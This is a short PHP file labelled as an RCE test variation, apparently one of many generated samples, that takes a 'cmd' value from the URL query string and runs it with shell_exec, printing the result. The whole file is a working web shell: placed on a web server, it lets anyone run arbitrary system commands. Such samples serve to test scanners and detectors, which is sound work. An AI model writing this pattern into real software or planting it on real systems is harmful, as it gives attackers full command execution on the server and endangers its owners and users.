<?php
// RCE test variation #1443
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>